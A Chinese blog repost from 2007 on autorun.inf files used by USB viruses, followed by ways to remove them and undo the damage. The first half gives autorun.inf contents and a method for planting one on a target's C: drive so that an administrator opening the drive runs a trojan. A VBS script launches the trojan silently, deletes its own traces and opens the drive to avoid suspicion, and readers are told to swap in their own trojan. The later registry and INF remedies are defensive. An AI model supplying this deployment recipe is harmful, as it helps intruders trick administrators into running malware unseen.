---
title: 病毒的Autoruninf新写法与应用以及防御
description: 首先是Autoruninf一般的病毒的Autoruninf文件内容为[autorun]open=.RECYCLERRECYCLERautorun.exeshell1=Openshell1Command=.RECYCLERRECYCLERautorun.exeshell2=Browsershell2Command=.RECYCLERRECYCLERautorun.exeshellexecute=.RECYCLERRECYCLERautorun.exe........................
date: 2007-09-08 12:15:05
category: 技术文章
tags: ['技术类', '安全', '病毒Virus', 'Autoruninf']
post_id: 155
alias: VirusAutorunInf
ViewNums: 6328
---

在[zj1244小葵&职业欠钱的blog](http://xdxf.cn/)上看到的，感觉不错，转之~

首先是Autoruninf
一般的病毒的Autoruninf文件内容为
[autorun]
open=.RECYCLERRECYCLERautorun.exe
shell1=Open
shell1Command=.RECYCLERRECYCLERautorun.exe
shell2=Browser
shell2Command=.RECYCLERRECYCLERautorun.exe

shellexecute=.RECYCLERRECYCLERautorun.exe
它的效果是当双击打开盘时.会运行RECYCLERRECYCLERautorun.exe文件,用右键打开,会显示Open,Browser.
还有一种是
[autorun]
OPEN=SVCH0ST.EXE
shellopen=打开(&O)
shellopenCommand=SVCH0ST.EXE
shellopenDefault=1
shellexplore=资源管理器(&X)
shellexploreCommand=SVCH0ST.EXE
对于这种U盘病毒，无论右键选择“打开”还是“资源管理器”病毒都会运行。
一种利用Autoruninf提权的方法（转）
以前看过很多关于Autoruninf的利用文章,网上全是千篇一律,互相模仿.我再来添点东西吧~

还是先简单说下原理吧.写一个Autoruninf文件,放在对方某一盘符下,当管理员双击此盘时,就会执行Autoruninf指定的文件了.一般用在入侵时没有运行权限时,欺骗管理员帮你运行..

以前我在网上看到的都是一个模式

[AutoRun]

open = 你想运行的程序

先不说这样运行是不是成功的,稍微想一下,就知道有问题,人家管理员不是傻子,这样双击是打不开盘符的,人家肯定知道出问题了,所以你玩不长的..

事实上那个文件在我机子是运行不起的,网上也没找到解决办法,相信还有很多人和我遇到过同样的问题,求人不如求已,自己搞定吧.

也不难,只要这样写就OK了:

[AutoRun]
open=AutoRun.exe
shellexecute=AutoRun.exe
shellAutocommand=AutoRun.exe

这样,你把它保存为一个.inf文件,放在C盘下,AutoRun.exe为你指定的运行程序.这样双击C盘就可以成功运行了.前面还说过一个问题,就是C盘打不开,很容易就被管理员发现了,有待改进.下来就说怎么解决这个问题,GO ON!

其实这个实现起来也不难,先把Autoruninf上传至对方C盘,我们可以做一个自解压包,也放在C盘根目录下,让他成为我们的指定运行文件,里面包含我们要运行的程序,比如木马,还一个VBS脚本,自解压包执行后先让他执行VBS脚本,内容如下:
```
set yu=wscript.createobject("wscript.shell")
yu.run "cmd /c start WINLOG0N.exe",0
yu.run "cmd /c del Autoruninf",0
yu.run "cmd /c start c:",0
yu.run "cmd /c del AutoRun.vbs",0
```
我再简单解释下,解压后VBS帮我们运行winlogon.exe(我配置好的木马),然后删掉Autoruninf,为什么要删掉它,第一,减少被发 现的机会,二,删掉它,管理员重启机子或注销后如果右键点击盘复符不会出现"播放",一切恢复中马前的状态,当然之前我们的木马已经运行了.第四行代码: 我们为他打开C盘,最后再删掉vbs脚本自身.

这样改进后个人觉得安全性大大提高了.呵呵..各位在测试的时候只须把上面脚本中的 WINLOG0N.exe改为自己的木马就可以了.winxp sp2下测试成功。
防治方法
其实这个文件不是病毒。也是用来打开病毒了。防治它的思路有两种：一是禁用自动播放，二是删除它，三是阻止它生成。
1。在Windows系统有允许和阻止自动运行的键值的方法：

　　 在注册表中找到如下键：

键路径：[HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesExploer]

在右侧窗格中有 "NoDriveTypeAutoRun"这个键决定了是否执行Autorun功能.其中每一位代表一个设备,不同设备用以下数值表示:

设备名称 第几位 值 设备用如下数值表示 设备名称含义
DRIVE_UNKNOWN 0 1 01h 不能识别的类型设备
DRIVE_NO_ROOT_DIR 1 0 02h 没有根目录的驱动器
DRIVE_REMOVABLE 2 1 04h 可移动驱动器
DRIVE_FIXED 3 0 08h 固定的驱动器
DRIVE_REMOTE 4 1 10h 网络驱动器
DRIVE_CDROM 5 0 20h 光驱
DRIVE_RAMDISK 6 0 40h RAM磁盘

其中： 保留 7 1 80h 　未指定的驱动器类型

以上值"0"表示设备运行，"1"表示设备不运行。
从上面可以看出，对应的DRIVE_NO_ROOT_DIR、DRIVE_FIXED、DRIVE_CDROM、DRIVE_RAMDISK是可以自动运 行的。所以要禁止硬盘自动运行Autoruninf文件，就必须将DRIVE_FIXED这些键的值设为1，由于DRIVE_FIXED代表固定的驱动 器(即硬盘)。如果仅想禁止软件光盘的AutoRun功能，但又保留对CD音频碟的自动播放能力，这时只需将“NoDriveTypeAutoRun”的 键值改为：BD,00,00,00即可。
     还有就是通过组策略关闭自动播放，但是在有些版本window xp 中不存在哪个策略。
2。为了防止Autoruninf的生成，我们可以在u盘根目录下创建一个名字是Autoruninf的文件夹。
3。我们可以选择在dos下删除文件，但是在通常情况下Autoruninf有系统，隐藏，只读属性。所以应该先去掉这些属性之后再删除文件。具体方法如下：
开始---运行---cmd（打开命令提示符）
D: dir /a a* （没有参数A是看不到的，A是显示所有的意思）
此时你会发现一个Autoruninf文件，
attrib Autoruninf -s -h -r 去掉Autoruninf文件的系统、只读、隐藏属性。然后就可以删除了
del Autoruninf
二.常见的病毒
通过autorun文件可以打开任何文件，所以很难讲什么是常见的。我所觉得有趣的是，运行病毒之后，病毒的自我保护方法。比如说存在保护程序，禁用注册表，禁用显示隐藏文件选项或文件夹选项。隐藏进程等等。
1。注册表的禁用与解用。

最好的方法是下载个注册表修复工具
你先到这里看看瑞星的注册表修复工具<http://it.rising.com.cn/service/technology/RegClean_download.htm>
如果仍然不能解决请按1楼的方法试试
假如"运行"被禁止掉那么请用下面介绍的方法

注册表编辑器已被禁用，我们用INF文件来解除。那么我们可以在记事本里写入下面的内容：
```
[Version]
Signature="$Windows NT$"

[DefaultInstall]
ADDREG=Myadd

[Myadd]
;解禁注册表编辑器
HKCU,SoftwareMicrosoftWindowsCurrentVersionPoliciesSystem,DisableRegistryTools,1,0
```
然后把文件另存为一个INF文件，右击文件----点“安装”就可以啦^O^
我们可以看到第一个语段，在Signature后面的签名"$Windows NT$"它是指明我的操作系统是NT的，如果你的操作系统是98的在后面的签名中应该写"$CHICAGO$"。
再看第二个语段，等号左边的“ADDREG”是不能更改的，等号右边的内容就随你的心情啦，但是有一点要注意，就是要与在第三个语段中使用的语句保持一致。另外还有一项操作是“DELREG”(删除键)和“ADDREG”的用法一样，后面介绍。
好了，这回各位看观是不是想要跃跃欲试了呢，不要着急，好像还有一点和REG文件不一样噢，呵呵我看出来了，就是在文件的最后，怎么有“，”(注：逗号)。还有“HKCU”这些都是什么呀？
这就是与REG文件不一样的格式啦。
“HKCU”指的是注册表中的根键，其中“HKCU”是“HKEY_CURRENT_USER”的缩写，其它的还有“HKCR”--- “HKEY_CLASSES_ROOT”、“HKLM”----“HKEY_LOCAL_MACHINE”、“HKU”---- “HKEY_USERS”、“HKCC”----“HKEY_CURRENT_CONFIG”、“HKDD”----“HKEY_DYN_DATA”。如 果你想要对哪个根键操作那么就可以按照上面的缩写对号入座了。
“，”(注：逗号)，它是根键与子键、子键与键名、键名与键类型、键类型与键值的分割符。
在具体修改注册表键值语段的格式为：根键，子键，键名，键类型，键值(注：中间的逗号不能省略)。
上面这个文件中我们知道其实要修改的是DisableRegistryTools键，把它的值改为“0”。它的类型为DWORD(双字节)，在INF文件 有关注册表的操作中有字符串类型(用“0”表示)和二进制类型(用“1”表示)，在网上没有找到INF文件表示双字节类型的资料，望知道的人补充。在这里 我们直接用二进制类型就可以了，所以大家看到在键类型的位置上是个“1”，最后是要修改的键值“0”。
前面提到“DELREG”它是删除键值的操作，如果要想把DisableRegistryTools键删除的话可以这样写：
```
[Version]
Signature="$Windows NT$"

[DefaultInstall]
DELREG=Mydel

[Mydel]
;删除DisableRegistryTools键
HKCU,SoftwareMicrosoftWindowsCurrentVersionPoliciesSystem,DisableRegistryTools
```
就是省略掉键类型和键值字段，最后把这个文件另存为一个INF文件，右击文件----点“安装”就可以了。
好了，不知道各位看观是不是看明白了，没看明白也没关系，我写了一个，大家只要把下面的内容复制到记事本中，然后把这个文件另存为一个INF文件，最后右 击文件----点“安装”就可以了。(注：这个文件可以解决前文中所提到问题，只能在NT系统中使用，主页会被改成20CN的首页，嘻嘻做个广告啦 ^O^)。

-----------------------------------------------------------------------------------
```
[Version]
Signature="$Windows NT$"

[DefaultInstall]
ADDREG=Myadd

[Myadd]
;解禁注册表编辑器
HKCU,SoftwareMicrosoftWindowsCurrentVersionPoliciesSystem,DisableRegistryTools,1,0
```
2。显示出被隐藏的系统文件

运行——regedit
```
HKEY_LOCAL_MACHINESoftwareMicrosoftwindowsCurrentVersionexplorerAdvancedFolderHiddenSHOWALL，将CheckedValue键值修改为1
```
这里要注意，病毒会把本来有效的DWORD值CheckedValue删除掉，新建了一个无效的字符串值CheckedValue，并且把键值改为0！我 们将这个改为1是毫无作用的。（有部分病毒变种会直接把这个CheckedValue给删掉，只需和下面一样，自己再重新建一个就可以了）

方法：删除此CheckedValue键值，单击右键 新建——Dword值——命名为CheckedValue，然后修改它的键值为1，这样就可以选择“显示所有隐藏文件”和“显示系统文件”。

在文件夹——工具——文件夹选项中将系统文件和隐藏文件设置为显示。

更多请参见：[**Autoruninf**完全操作手册](/blog/autoruninf-handbook)

